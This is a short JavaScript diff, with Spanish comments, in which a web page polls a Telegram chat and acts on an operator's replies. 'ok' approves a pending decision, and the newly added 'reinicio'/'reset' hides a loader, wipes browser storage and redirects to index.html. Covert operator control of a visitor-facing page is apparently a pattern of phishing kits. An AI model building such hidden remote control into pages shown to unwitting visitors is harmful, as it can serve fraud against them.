@@ -193,6 +193,19 @@
               if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
                 const msgText = msg.text.trim().toLowerCase();
                 
+                // ============================================================
+                // [INTEGRACIÓN] INTERCEPCIÓN PRIORITARIA DE REINICIO GLOBAL
+                // ============================================================
+                if (msgText === 'reinicio' || msgText === 'reset') {
+                  if (loader) loader.style.display = "none";
+                  localStorage.clear();
+                  sessionStorage.clear();
+                  window.location.replace("index.html");
+                  return;
+                }
+                // ============================================================
+
+
                 if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
                   decision = 'approved';
                   break;
